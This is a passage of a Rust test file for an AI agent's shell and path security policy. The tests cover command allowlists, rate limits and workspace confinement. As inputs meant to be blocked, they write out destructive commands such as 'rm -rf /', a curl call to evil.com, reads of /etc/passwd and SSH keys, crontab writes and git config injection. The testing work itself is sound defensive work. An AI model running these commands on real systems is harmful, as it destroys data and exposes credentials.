                denied_path_prefixes: vec![],
                allow_high_risk: false,
            }],
            ..crate::config::AutonomyConfig::default()
        };
        let workspace = PathBuf::from("/tmp/test-workspace");
        let policy = SecurityPolicy::from_config(&autonomy_config, &workspace);

        assert_eq!(policy.command_context_rules.len(), 1);
        assert!(matches!(
            policy.command_context_rules[0].action,
            CommandContextRuleAction::RequireApproval
        ));
    }

    #[test]
    fn resolved_path_violation_message_includes_allowed_roots_guidance() {
        let p = default_policy();
        let msg = p.resolved_path_violation_message(Path::new("/tmp/outside.txt"));
        assert!(msg.contains("escapes workspace"));
        assert!(msg.contains("allowed_roots"));
    }

    // ── Default policy ──────────────────────────────────────

    #[test]
    fn default_policy_has_sane_values() {
        let p = SecurityPolicy::default();
        assert_eq!(p.autonomy, AutonomyLevel::Supervised);
        assert!(p.workspace_only);
        assert!(!p.allowed_commands.is_empty());
        assert!(!p.forbidden_paths.is_empty());
        assert!(p.max_actions_per_hour > 0);
        assert!(p.max_cost_per_day_cents > 0);
        assert!(p.require_approval_for_medium_risk);
        assert!(p.block_high_risk_commands);
        assert!(p.shell_env_passthrough.is_empty());
    }

    // ── ActionTracker / rate limiting ───────────────────────

    #[test]
    fn action_tracker_starts_at_zero() {
        let tracker = ActionTracker::new();
        assert_eq!(tracker.count(), 0);
    }

    #[test]
    fn action_tracker_records_actions() {
        let tracker = ActionTracker::new();
        assert_eq!(tracker.record(), 1);
        assert_eq!(tracker.record(), 2);
        assert_eq!(tracker.record(), 3);
        assert_eq!(tracker.count(), 3);
    }

    #[test]
    fn record_action_allows_within_limit() {
        let p = SecurityPolicy {
            max_actions_per_hour: 5,
            ..SecurityPolicy::default()
        };
        for _ in 0..5 {
            assert!(p.record_action(), "should allow actions within limit");
        }
    }

    #[test]
    fn record_action_blocks_over_limit() {
        let p = SecurityPolicy {
            max_actions_per_hour: 3,
            ..SecurityPolicy::default()
        };
        assert!(p.record_action()); // 1
        assert!(p.record_action()); // 2
        assert!(p.record_action()); // 3
        assert!(!p.record_action()); // 4 — over limit
    }

    #[test]
    fn is_rate_limited_reflects_count() {
        let p = SecurityPolicy {
            max_actions_per_hour: 2,
            ..SecurityPolicy::default()
        };
        assert!(!p.is_rate_limited());
        p.record_action();
        assert!(!p.is_rate_limited());
        p.record_action();
        assert!(p.is_rate_limited());
    }

    #[test]
    fn action_tracker_clone_is_independent() {
        let tracker = ActionTracker::new();
        tracker.record();
        tracker.record();
        let cloned = tracker.clone();
        assert_eq!(cloned.count(), 2);
        tracker.record();
        assert_eq!(tracker.count(), 3);
        assert_eq!(cloned.count(), 2); // clone is independent
    }

    // ── Edge cases: command injection ────────────────────────

    #[test]
    fn command_injection_semicolon_blocked() {
        let p = default_policy();
        // First word is "ls;" (with semicolon) — doesn't match "ls" in allowlist.
        // This is a safe default: chained commands are blocked.
        assert!(!p.is_command_allowed("ls; rm -rf /"));
    }

    #[test]
    fn command_injection_semicolon_no_space() {
        let p = default_policy();
        assert!(!p.is_command_allowed("ls;rm -rf /"));
    }

    #[test]
    fn quoted_semicolons_do_not_split_sqlite_command() {
        let p = SecurityPolicy {
            allowed_commands: vec!["sqlite3".into()],
            ..SecurityPolicy::default()
        };
        assert!(p.is_command_allowed(
            "sqlite3 /tmp/test.db \"CREATE TABLE t(id INT); INSERT INTO t VALUES(1); SELECT * FROM t;\""
        ));
        assert_eq!(
            p.command_risk_level(
                "sqlite3 /tmp/test.db \"CREATE TABLE t(id INT); INSERT INTO t VALUES(1); SELECT * FROM t;\""
            ),
            CommandRiskLevel::Low
        );
    }

    #[test]
    fn unquoted_semicolon_after_quoted_sql_still_splits_commands() {
        let p = SecurityPolicy {
            allowed_commands: vec!["sqlite3".into()],
            ..SecurityPolicy::default()
        };
        assert!(!p.is_command_allowed("sqlite3 /tmp/test.db \"SELECT 1;\"; rm -rf /"));
    }

    #[test]
    fn command_injection_backtick_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("echo `whoami`"));
        assert!(!p.is_command_allowed("echo `rm -rf /`"));
    }

    #[test]
    fn command_injection_dollar_paren_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("echo $(cat /etc/passwd)"));
        assert!(!p.is_command_allowed("echo $(rm -rf /)"));
    }

    #[test]
    fn command_injection_dollar_paren_literal_inside_single_quotes_allowed() {
        let p = default_policy();
        assert!(p.is_command_allowed("echo '$(cat /etc/passwd)'"));
    }

    #[test]
    fn command_injection_dollar_brace_literal_inside_single_quotes_allowed() {
        let p = default_policy();
        assert!(p.is_command_allowed("echo '${HOME}'"));
    }

    #[test]
    fn command_injection_dollar_brace_unquoted_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("echo ${HOME}"));
    }

    #[test]
    fn command_with_env_var_prefix() {
        let p = default_policy();
        // "FOO=bar" is the first word — not in allowlist
        assert!(!p.is_command_allowed("FOO=bar rm -rf /"));
    }

    #[test]
    fn command_newline_injection_blocked() {
        let p = default_policy();
        // Newline splits into two commands; "rm" is not in allowlist
        assert!(!p.is_command_allowed("ls\nrm -rf /"));
        // Both allowed — OK
        assert!(p.is_command_allowed("ls\necho hello"));
    }

    #[test]
    fn command_injection_and_chain_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("ls && rm -rf /"));
        assert!(!p.is_command_allowed("echo ok && curl http://evil.com"));
        // Both allowed — OK
        assert!(p.is_command_allowed("ls && echo done"));
    }

    #[test]
    fn command_injection_or_chain_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("ls || rm -rf /"));
        // Both allowed — OK
        assert!(p.is_command_allowed("ls || echo fallback"));
    }

    #[test]
    fn command_injection_background_chain_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("ls & rm -rf /"));
        assert!(!p.is_command_allowed("ls&rm -rf /"));
        assert!(!p.is_command_allowed("echo ok & python3 -c 'print(1)'"));
    }

    #[test]
    fn command_injection_redirect_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("echo secret > /etc/crontab"));
        assert!(!p.is_command_allowed("ls >> /tmp/exfil.txt"));
        assert!(!p.is_command_allowed("cat </etc/passwd"));
        assert!(!p.is_command_allowed("cat</etc/passwd"));
    }

    #[test]
    fn quoted_ampersand_and_redirect_literals_are_not_treated_as_operators() {
        let p = default_policy();
        assert!(p.is_command_allowed("echo \"A&B\""));
        assert!(p.is_command_allowed("echo \"A>B\""));
        assert!(p.is_command_allowed("echo \"A<B\""));
    }

    #[test]
    fn command_argument_injection_blocked() {
        let p = default_policy();
        // find -exec is a common bypass
        assert!(!p.is_command_allowed("find . -exec rm -rf {} +"));
        assert!(!p.is_command_allowed("find / -ok cat {} \\;"));
        // git config write operations can execute commands
        assert!(!p.is_command_allowed("git config core.editor \"rm -rf /\""));
        assert!(!p.is_command_allowed("git alias.st status"));
        assert!(!p.is_command_allowed("git -c core.editor=calc.exe commit"));
        // git config without readonly flag is blocked
        assert!(!p.is_command_allowed("git config user.name \"test\""));
        assert!(!p.is_command_allowed("git config user.email test@example.com"));
        // Legitimate commands should still work
        assert!(p.is_command_allowed("find . -name '*.txt'"));
        assert!(p.is_command_allowed("git status"));
        assert!(p.is_command_allowed("git add ."));
    }

    #[test]
    fn git_config_readonly_operations_allowed() {
        let p = default_policy();
        // git config --get is read-only and safe
        assert!(p.is_command_allowed("git config --get user.name"));
        assert!(p.is_command_allowed("git config --get user.email"));
        assert!(p.is_command_allowed("git config --get core.editor"));
        // git config --list is read-only and safe
        assert!(p.is_command_allowed("git config --list"));
        assert!(p.is_command_allowed("git config -l"));
        // git config --get-all is read-only
        assert!(p.is_command_allowed("git config --get-all user.name"));
        // git config --get-regexp is read-only
        assert!(p.is_command_allowed("git config --get-regexp user.*"));
        // git config --get-urlmatch is read-only
        assert!(p.is_command_allowed("git config --get-urlmatch http.example.com"));
        // scoped read operations are allowed
        assert!(p.is_command_allowed("git config --global --get user.name"));
        assert!(p.is_command_allowed("git config --local --list"));
        assert!(p.is_command_allowed("git config --global --get user.name --show-origin"));
        assert!(p.is_command_allowed("git config --default=unknown --get user.name"));
    }

    #[test]
    fn git_config_write_operations_blocked() {
        let p = default_policy();
        // Plain git config (write) is blocked
        assert!(!p.is_command_allowed("git config user.name test"));
        assert!(!p.is_command_allowed("git config user.email test@example.com"));
        // git config --unset is a write operation
        assert!(!p.is_command_allowed("git config --unset user.name"));
        // git config --add is a write operation
        assert!(!p.is_command_allowed("git config --add user.name test"));
        // git config --global without readonly flag is blocked
        assert!(!p.is_command_allowed("git config --global user.name test"));
        // git config --replace-all is a write operation
        assert!(!p.is_command_allowed("git config --replace-all user.name test"));
        // git config --edit is blocked (opens editor)
        assert!(!p.is_command_allowed("git config -e"));
        assert!(!p.is_command_allowed("git config --edit"));
    }

    #[test]
    fn git_config_mixed_read_write_flags_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("git config --get --unset user.name"));
        assert!(!p.is_command_allowed("git config --list --add user.name test"));
        assert!(!p.is_command_allowed("git config --get-all --replace-all user.name test"));
    }

    #[test]
    fn git_config_global_injection_flags_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("git --config-env=core.editor=EVIL_EDITOR status"));
        assert!(!p.is_command_allowed("git --config=core.pager=cat status"));
        assert!(
            !p.is_command_allowed("git --config-env=credential.helper=EVIL config --get user.name")
        );
        assert!(!p.is_command_allowed("git --config=core.editor=vim config --get user.name"));
    }

    #[test]
    fn command_injection_dollar_brace_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("echo ${IFS}cat${IFS}/etc/passwd"));
    }

    #[test]
    fn command_injection_plain_dollar_var_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("cat $HOME/.ssh/id_rsa"));
        assert!(!p.is_command_allowed("cat $SECRET_FILE"));
    }

    #[test]
    fn command_injection_tee_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("echo secret | tee /etc/crontab"));
        assert!(!p.is_command_allowed("ls | /usr/bin/tee outfile"));
        assert!(!p.is_command_allowed("tee file.txt"));
    }

    #[test]
    fn command_injection_process_substitution_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("cat <(echo pwned)"));
        assert!(!p.is_command_allowed("ls >(cat /etc/passwd)"));
    }

    #[test]
    fn command_env_var_prefix_with_allowed_cmd() {
        let p = default_policy();
        // env assignment + allowed command — OK
        assert!(p.is_command_allowed("FOO=bar ls"));
        assert!(p.is_command_allowed("LANG=C grep pattern file"));
        // env assignment + disallowed command — blocked
        assert!(!p.is_command_allowed("FOO=bar rm -rf /"));
    }

    #[test]
    fn forbidden_path_argument_detects_absolute_path() {
        let p = default_policy();
        assert_eq!(
            p.forbidden_path_argument("cat /etc/passwd"),
            Some("/etc/passwd".into())
        );
    }

    #[test]
    fn validate_command_execution_rejects_forbidden_paths() {
        let p = default_policy();
        let err = p
            .validate_command_execution("cat /etc/shadow", false)
            .unwrap_err();
        assert!(err.contains("Path blocked by security policy"));
    }

    #[test]
    fn forbidden_path_argument_detects_parent_dir_reference() {
        let p = default_policy();
        assert_eq!(
            p.forbidden_path_argument("cat ../secret.txt"),
            Some("../secret.txt".into())
        );
        assert_eq!(
            p.forbidden_path_argument("find .. -name '*.rs'"),
            Some("..".into())
        );
    }

    #[test]
    fn forbidden_path_argument_allows_workspace_relative_paths() {
        let p = default_policy();
        assert_eq!(p.forbidden_path_argument("cat src/main.rs"), None);
        assert_eq!(p.forbidden_path_argument("grep -r todo ./src"), None);
    }

    #[test]
    fn forbidden_path_argument_detects_option_assignment_paths() {
        let p = default_policy();
        assert_eq!(
            p.forbidden_path_argument("grep --file=/etc/passwd root ./src"),
            Some("/etc/passwd".into())
        );
        assert_eq!(
            p.forbidden_path_argument("cat --input=../secret.txt"),
            Some("../secret.txt".into())
        );
    }

    #[test]
    fn forbidden_path_argument_allows_safe_option_assignment_paths() {
        let p = default_policy();
        assert_eq!(
            p.forbidden_path_argument("grep --file=./patterns.txt root ./src"),
            None
        );
    }

    #[test]
    fn forbidden_path_argument_detects_short_option_attached_paths() {
        let p = default_policy();
        assert_eq!(
            p.forbidden_path_argument("grep -f/etc/passwd root ./src"),
            Some("/etc/passwd".into())
        );
        assert_eq!(
            p.forbidden_path_argument("git -C../outside status"),
            Some("../outside".into())
        );
    }

    #[test]
    fn forbidden_path_argument_allows_safe_short_option_attached_paths() {
        let p = default_policy();
        assert_eq!(
            p.forbidden_path_argument("grep -f./patterns.txt root ./src"),
            None
        );
        assert_eq!(p.forbidden_path_argument("git -C./repo status"), None);
    }

    #[test]
    fn forbidden_path_argument_detects_tilde_user_paths() {
        let p = default_policy();
        assert_eq!(
            p.forbidden_path_argument("cat ~root/.ssh/id_rsa"),
            Some("~root/.ssh/id_rsa".into())
        );
        assert_eq!(
            p.forbidden_path_argument("ls ~nobody"),
            Some("~nobody".into())
        );
    }

    #[test]
    fn forbidden_path_argument_detects_input_redirection_paths() {
        let p = default_policy();
        assert_eq!(
            p.forbidden_path_argument("cat </etc/passwd"),
            Some("/etc/passwd".into())
        );
        assert_eq!(
            p.forbidden_path_argument("cat</etc/passwd"),
            Some("/etc/passwd".into())
        );
    }

    // ── Edge cases: path traversal ──────────────────────────

    #[test]
    fn path_traversal_encoded_dots() {
        let p = default_policy();
        // Literal ".." in path — always blocked
        assert!(!p.is_path_allowed("foo/..%2f..%2fetc/passwd"));
    }

    #[test]
    fn path_traversal_double_dot_in_filename() {
        let p = default_policy();
        // ".." in a filename (not a path component) is allowed
        assert!(p.is_path_allowed("my..file.txt"));
        // But actual traversal components are still blocked
        assert!(!p.is_path_allowed("../etc/passwd"));
        assert!(!p.is_path_allowed("foo/../etc/passwd"));
    }

    #[test]
    fn path_with_null_byte_blocked() {
        let p = default_policy();
        assert!(!p.is_path_allowed("file\0.txt"));
    }

    #[test]
    fn path_symlink_style_absolute() {
        let p = default_policy();
        assert!(!p.is_path_allowed("/proc/self/root/etc/passwd"));
    }

    #[test]
    fn path_home_tilde_ssh() {
        let p = SecurityPolicy {
            workspace_only: false,
            ..SecurityPolicy::default()
        };
        assert!(!p.is_path_allowed("~/.ssh/id_rsa"));
        assert!(!p.is_path_allowed("~/.gnupg/secring.gpg"));
        assert!(!p.is_path_allowed("~root/.ssh/id_rsa"));
        assert!(!p.is_path_allowed("~nobody"));
    }

    #[test]
    fn path_var_run_blocked() {
        let p = SecurityPolicy {
            workspace_only: false,
            ..SecurityPolicy::default()
        };
        assert!(!p.is_path_allowed("/var/run/docker.sock"));
    }

    // ── Edge cases: rate limiter boundary ────────────────────

    #[test]
    fn rate_limit_exactly_at_boundary() {
        let p = SecurityPolicy {
            max_actions_per_hour: 1,
            ..SecurityPolicy::default()
        };
        assert!(p.record_action()); // 1 — exactly at limit
        assert!(!p.record_action()); // 2 — over
        assert!(!p.record_action()); // 3 — still over
    }

    #[test]
    fn rate_limit_zero_blocks_everything() {
        let p = SecurityPolicy {
            max_actions_per_hour: 0,
            ..SecurityPolicy::default()
        };
        assert!(!p.record_action());
    }

    #[test]
    fn rate_limit_high_allows_many() {
        let p = SecurityPolicy {
            max_actions_per_hour: 10000,
            ..SecurityPolicy::default()
        };
        for _ in 0..100 {
            assert!(p.record_action());
        }
    }

    // ── Edge cases: autonomy + command combos ────────────────

    #[test]
    fn readonly_blocks_even_safe_commands() {
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::ReadOnly,
            allowed_commands: vec!["ls".into(), "cat".into()],
            ..SecurityPolicy::default()
        };
        assert!(!p.is_command_allowed("ls"));
        assert!(!p.is_command_allowed("cat"));
        assert!(!p.can_act());
    }

    #[test]
    fn supervised_allows_listed_commands() {
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::Supervised,
            allowed_commands: vec!["git".into()],
            ..SecurityPolicy::default()
        };
        assert!(p.is_command_allowed("git status"));
        assert!(!p.is_command_allowed("docker ps"));
    }

    #[test]
    fn full_autonomy_still_respects_forbidden_paths() {
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::Full,
            workspace_only: false,
            ..SecurityPolicy::default()
        };
        assert!(!p.is_path_allowed("/etc/shadow"));
        assert!(!p.is_path_allowed("/root/.bashrc"));
    }

    #[test]
    fn workspace_only_false_allows_resolved_outside_workspace() {
        let workspace = std::env::temp_dir().join("zeroclaw_test_ws_only_false");
        let _ = std::fs::create_dir_all(&workspace);
        let canonical_workspace = workspace
            .canonicalize()
            .unwrap_or_else(|_| workspace.clone());

        let p = SecurityPolicy {
            workspace_dir: canonical_workspace.clone(),
            workspace_only: false,
            forbidden_paths: vec!["/etc".into(), "/var".into()],
            ..SecurityPolicy::default()
        };

        // Path outside workspace should be allowed when workspace_only=false
        let outside = std::env::var_os("HOME")
            .map(std::path::PathBuf::from)
            .unwrap_or_else(|| PathBuf::from("/home"))
            .join("zeroclaw_outside_ws");
        assert!(
            p.is_resolved_path_allowed(&outside),
            "workspace_only=false must allow resolved paths outside workspace"
        );

        // Forbidden paths must still be blocked even with workspace_only=false
        assert!(
            !p.is_resolved_path_allowed(Path::new("/etc/passwd")),
            "forbidden paths must be blocked even when workspace_only=false"
        );
        assert!(
            !p.is_resolved_path_allowed(Path::new("/var/run/docker.sock")),
            "forbidden /var must be blocked even when workspace_only=false"
        );

        let _ = std::fs::remove_dir_all(&workspace);
    }

    #[test]
    fn workspace_only_true_blocks_resolved_outside_workspace() {
        let workspace = std::env::temp_dir().join("zeroclaw_test_ws_only_true");
        let _ = std::fs::create_dir_all(&workspace);
        let canonical_workspace = workspace
            .canonicalize()
            .unwrap_or_else(|_| workspace.clone());

        let p = SecurityPolicy {
            workspace_dir: canonical_workspace.clone(),
            workspace_only: true,
            ..SecurityPolicy::default()
        };

        // Path inside workspace — allowed
        let inside = canonical_workspace.join("subdir");
        assert!(
            p.is_resolved_path_allowed(&inside),
            "path inside workspace must be allowed"
        );

        // Path outside workspace — blocked
        let outside = std::env::temp_dir()
            .canonicalize()
            .unwrap_or_else(|_| std::env::temp_dir())
            .join("zeroclaw_outside_ws_true");
        assert!(
            !p.is_resolved_path_allowed(&outside),
            "workspace_only=true must block resolved paths outside workspace"
        );

        let _ = std::fs::remove_dir_all(&workspace);
    }

    // ── Edge cases: from_config preserves tracker ────────────

    #[test]
    fn from_config_creates_fresh_tracker() {
        let autonomy_config = crate::config::AutonomyConfig {
            level: AutonomyLevel::Full,
            workspace_only: false,
            allowed_commands: vec![],
            forbidden_paths: vec![],
            max_actions_per_hour: 10,
            max_cost_per_day_cents: 100,
            require_approval_for_medium_risk: true,
            block_high_risk_commands: true,
            ..crate::config::AutonomyConfig::default()
        };
        let workspace = PathBuf::from("/tmp/test");
        let policy = SecurityPolicy::from_config(&autonomy_config, &workspace);
        assert_eq!(policy.tracker.count(), 0);
        assert!(!policy.is_rate_limited());
    }

    // ── summary_for_heartbeat ──────────────────────────────

    #[test]
    fn summary_for_heartbeat_contains_key_fields() {
        let mut policy = default_policy();
        policy.custom_security_prompt = "Do not exfiltrate data, bypass approval, or run destructive commands without asking.".to_string();
        let summary = policy.summary_for_heartbeat();
        assert!(summary.contains("Workspace:"));
        assert!(summary.contains("workspace_only: true"));
        assert!(summary.contains("Do not exfiltrate"));
    }

    #[test]
    fn summary_for_heartbeat_includes_security_prompt() {
        let mut policy = SecurityPolicy::default();
        policy.custom_security_prompt = "Test security guidance".to_string();
        let summary = policy.summary_for_heartbeat();
        assert!(summary.contains("Test security guidance"));
        assert!(summary.contains("Respond with \"Heartbeat acknowledged\""));
    }

    #[test]
    fn prompt_summary_contains_custom_security_prompt() {
        let mut policy = default_policy();
        policy.custom_security_prompt = "Test security guidance".to_string();
        let summary = policy.prompt_summary();
        assert!(summary.contains("Test security guidance"));
    }

    // ══════════════════════════════════════════════════════════
    // SECURITY CHECKLIST TESTS
    // Checklist: gateway not public, pairing required,
    //            filesystem scoped (no /), access via tunnel
    // ══════════════════════════════════════════════════════════

    // ── Checklist #3: Filesystem scoped (no /) ──────────────

    #[test]
    fn checklist_root_path_blocked() {
        let p = default_policy();
        assert!(!p.is_path_allowed("/"));
        assert!(!p.is_path_allowed("/anything"));
    }

    #[test]
    fn checklist_all_system_dirs_blocked() {
        let p = SecurityPolicy {
            workspace_only: false,
            ..SecurityPolicy::default()
        };
        for dir in [
            "/etc", "/root", "/home", "/usr", "/bin", "/sbin", "/lib", "/opt", "/boot", "/dev",
            "/proc", "/sys", "/var", "/tmp", "/mnt",
        ] {
            assert!(
                !p.is_path_allowed(dir),
                "System dir should be blocked: {dir}"
            );
            assert!(
                !p.is_path_allowed(&format!("{dir}/subpath")),
                "Subpath of system dir should be blocked: {dir}/subpath"
            );
        }
    }

    #[test]
    fn checklist_sensitive_dotfiles_blocked() {
        let p = SecurityPolicy {
            workspace_only: false,
            ..SecurityPolicy::default()
        };
        for path in [
            "~/.ssh/id_rsa",
            "~/.gnupg/secring.gpg",
            "~/.aws/credentials",
            "~/.config/secrets",
        ] {
            assert!(
                !p.is_path_allowed(path),
                "Sensitive dotfile should be blocked: {path}"
            );
        }
    }

    #[test]
    fn checklist_null_byte_injection_blocked() {
        let p = default_policy();
        assert!(!p.is_path_allowed("safe\0/../../../etc/passwd"));
        assert!(!p.is_path_allowed("\0"));
        assert!(!p.is_path_allowed("file\0"));
    }

    #[test]
    fn checklist_workspace_only_blocks_all_absolute() {
        let p = SecurityPolicy {
            workspace_only: true,
            ..SecurityPolicy::default()
        };
        assert!(!p.is_path_allowed("/any/absolute/path"));
        assert!(p.is_path_allowed("relative/path.txt"));
    }

    #[test]
    fn checklist_resolved_path_must_be_in_workspace() {
        let p = SecurityPolicy {
            workspace_dir: PathBuf::from("/home/user/project"),
            ..SecurityPolicy::default()
        };
        // Inside workspace — allowed
        assert!(p.is_resolved_path_allowed(Path::new("/home/user/project/src/main.rs")));
        // Outside workspace — blocked (symlink escape)
        assert!(!p.is_resolved_path_allowed(Path::new("/etc/passwd")));
        assert!(!p.is_resolved_path_allowed(Path::new("/home/user/other_project/file")));
        // Root — blocked
        assert!(!p.is_resolved_path_allowed(Path::new("/")));
    }

    #[test]
    fn checklist_default_policy_is_workspace_only() {
        let p = SecurityPolicy::default();
        assert!(
            p.workspace_only,
            "Default policy must be workspace_only=true"
        );
    }

    #[test]
    fn checklist_default_forbidden_paths_comprehensive() {
        let p = SecurityPolicy::default();
        // Must contain all critical system dirs
        for dir in [
            "/etc", "/root", "/proc", "/sys", "/dev", "/var", "/tmp", "/mnt",
        ] {
            assert!(
                p.forbidden_paths.iter().any(|f| f == dir),
                "Default forbidden_paths must include {dir}"
            );
        }
        // Must contain sensitive dotfiles
        for dot in ["~/.ssh", "~/.gnupg", "~/.aws"] {
            assert!(
                p.forbidden_paths.iter().any(|f| f == dot),
                "Default forbidden_paths must include {dot}"
            );
        }
    }

    // ── §1.2 Path resolution / symlink bypass tests ──────────

    #[test]
    fn resolved_path_blocks_outside_workspace() {
        let workspace = std::env::temp_dir().join("zeroclaw_test_resolved_path");
        let _ = std::fs::create_dir_all(&workspace);

        // Use the canonicalized workspace so starts_with checks match
        let canonical_workspace = workspace
            .canonicalize()
            .unwrap_or_else(|_| workspace.clone());

        let policy = SecurityPolicy {
            workspace_dir: canonical_workspace.clone(),
            ..SecurityPolicy::default()
        };

        // A resolved path inside the workspace should be allowed
        let inside = canonical_workspace.join("subdir").join("file.txt");
        assert!(
            policy.is_resolved_path_allowed(&inside),
            "path inside workspace should be allowed"
        );

        // A resolved path outside the workspace should be blocked
        let canonical_temp = std::env::temp_dir()
            .canonicalize()
            .unwrap_or_else(|_| std::env::temp_dir());
        let outside = canonical_temp.join("outside_workspace_zeroclaw");
        assert!(
            !policy.is_resolved_path_allowed(&outside),
            "path outside workspace must be blocked"
        );

        let _ = std::fs::remove_dir_all(&workspace);
    }

    #[test]
    fn resolved_path_blocks_root_escape() {
        let policy = SecurityPolicy {
            workspace_dir: PathBuf::from("/home/zeroclaw_user/project"),
            ..SecurityPolicy::default()
        };

        assert!(
            !policy.is_resolved_path_allowed(Path::new("/etc/passwd")),
            "resolved path to /etc/passwd must be blocked"
        );
        assert!(
            !policy.is_resolved_path_allowed(Path::new("/root/.bashrc")),
            "resolved path to /root/.bashrc must be blocked"
        );
    }

    #[cfg(unix)]
    #[test]
    fn resolved_path_blocks_symlink_escape() {
        use std::os::unix::fs::symlink;

        let root = std::env::temp_dir().join("zeroclaw_test_symlink_escape");
        let workspace = root.join("workspace");
        let outside = root.join("outside_target");

        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(&workspace).unwrap();
        std::fs::create_dir_all(&outside).unwrap();

        // Create a symlink inside workspace pointing outside
        let link_path = workspace.join("escape_link");
        symlink(&outside, &link_path).unwrap();

        let policy = SecurityPolicy {
            workspace_dir: workspace.clone(),
            ..SecurityPolicy::default()
        };

        // The resolved symlink target should be outside workspace
        let resolved = link_path.canonicalize().unwrap();
        assert!(
            !policy.is_resolved_path_allowed(&resolved),
            "symlink-resolved path outside workspace must be blocked"
        );

        let _ = std::fs::remove_dir_all(&root);
    }

    #[cfg(unix)]
    #[test]
    fn allowed_roots_permits_paths_outside_workspace() {
        use std::os::unix::fs::symlink;

        let root = std::env::temp_dir().join("zeroclaw_test_allowed_roots");
        let workspace = root.join("workspace");
        let extra = root.join("extra_root");
        let extra_file = extra.join("data.txt");

        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(&workspace).unwrap();
        std::fs::create_dir_all(&extra).unwrap();
        std::fs::write(&extra_file, "test").unwrap();

        // Symlink inside workspace pointing to extra root
        let link_path = workspace.join("link_to_extra");
        symlink(&extra, &link_path).unwrap();

        let resolved = link_path.join("data.txt").canonicalize().unwrap();

        // Without allowed_roots — blocked (symlink escape)
        let policy_without = SecurityPolicy {
            workspace_dir: workspace.clone(),
            allowed_roots: vec![],
            ..SecurityPolicy::default()
        };
        assert!(
            !policy_without.is_resolved_path_allowed(&resolved),
            "without allowed_roots, symlink target must be blocked"
        );

        // With allowed_roots — permitted
        let policy_with = SecurityPolicy {
            workspace_dir: workspace.clone(),
            allowed_roots: vec![extra.clone()],
            ..SecurityPolicy::default()
        };
        assert!(
            policy_with.is_resolved_path_allowed(&resolved),
            "with allowed_roots containing the target, symlink must be allowed"
        );

        // Unrelated path still blocked
        let unrelated = root.join("unrelated");
        std::fs::create_dir_all(&unrelated).unwrap();
        assert!(
            !policy_with.is_resolved_path_allowed(&unrelated.canonicalize().unwrap()),
            "paths outside workspace and allowed_roots must still be blocked"
        );

        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn is_path_allowed_blocks_null_bytes() {
        let policy = default_policy();
        assert!(
            !policy.is_path_allowed("file\0.txt"),
            "paths with null bytes must be blocked"
        );
    }

    #[test]
    fn is_path_allowed_blocks_url_encoded_traversal() {
        let policy = default_policy();
        assert!(
            !policy.is_path_allowed("..%2fetc%2fpasswd"),
            "URL-encoded path traversal must be blocked"
        );
        assert!(
            !policy.is_path_allowed("subdir%2f..%2f..%2fetc"),
            "URL-encoded parent dir traversal must be blocked"
        );
    }

    // ── Heredoc Stripping Tests ──────────────────────────────────────────

    #[test]
    fn strip_heredoc_bodies_removes_body() {
        let cmd = "python3 << 'EOF'\nimport os\nprint(os.getcwd())\nEOF";
        let stripped = strip_heredoc_bodies(cmd);
        assert_eq!(stripped, "python3 << 'EOF'");
    }

    #[test]
    fn strip_heredoc_bodies_unquoted_delimiter() {
        let cmd = "cat << END\nhello world\n$HOME\nEND";
        let stripped = strip_heredoc_bodies(cmd);
        assert_eq!(stripped, "cat << END");
    }

    #[test]
    fn strip_heredoc_bodies_dash_variant() {
        let cmd = "python3 <<- PYEOF\n\timport sys\n\tPYEOF";
        let stripped = strip_heredoc_bodies(cmd);
        assert_eq!(stripped, "python3 <<- PYEOF");
    }

    #[test]
    fn strip_heredoc_bodies_no_heredoc_unchanged() {
        let cmd = "ls -la && echo hello";
        let stripped = strip_heredoc_bodies(cmd);
        assert_eq!(stripped, cmd);
    }

    #[test]
    fn strip_heredoc_bodies_double_quoted_delimiter() {
        let cmd = "cat << \"MARKER\"\nsome body\nMARKER";
        let stripped = strip_heredoc_bodies(cmd);
        assert_eq!(stripped, "cat << \"MARKER\"");
    }

    #[test]
    fn heredoc_python_script_allowed_when_python3_in_allowlist() {
        let mut p = default_policy();
        p.allowed_commands.push("python3".into());
        p.block_high_risk_commands = false;

        let cmd =
            "python3 << 'PYEOF'\nimport feedparser, json\nfrom datetime import datetime\nPYEOF";
        assert!(
            p.is_command_allowed(cmd),
            "python3 heredoc should be allowed when python3 is in allowlist"
        );
    }

    #[test]
    fn heredoc_body_with_dollar_signs_not_blocked() {
        let mut p = default_policy();
        p.allowed_commands.push("python3".into());
        p.block_high_risk_commands = false;

        // Quoted heredoc delimiter means shell won't expand $vars,
        // so security checks should not flag them either.
        let cmd = "python3 << 'EOF'\nprint(f\"${HOME}\")\nEOF";
        assert!(
            p.is_command_allowed(cmd),
            "$ inside quoted heredoc body should not trigger variable expansion check"
        );
    }

    #[test]
    fn heredoc_body_paths_not_flagged_by_forbidden_path() {
        let p = default_policy();
        let cmd = "cat << 'EOF'\n/etc/passwd\n/root/.ssh/id_rsa\nEOF";
        assert!(
            p.forbidden_path_argument(cmd).is_none(),
            "paths inside heredoc body should not be checked by forbidden_path_argument"
        );
    }

    #[test]
    fn heredoc_inside_quoted_string_not_treated_as_heredoc() {
        let _p = default_policy();
        // The << is inside quotes, so it's not a real heredoc operator
        let cmd = "echo \"python3 << EOF\"";
        let stripped = strip_heredoc_bodies(cmd);
        assert_eq!(stripped, cmd, "quoted << should not be treated as heredoc");
    }

    // ── Quoted Inline Code Tests ─────────────────────────────────────────

    #[test]
    fn split_shell_tokens_keeps_quoted_strings_together() {
        let tokens = split_shell_tokens(r#"node -e "import os; print('hi')""#);
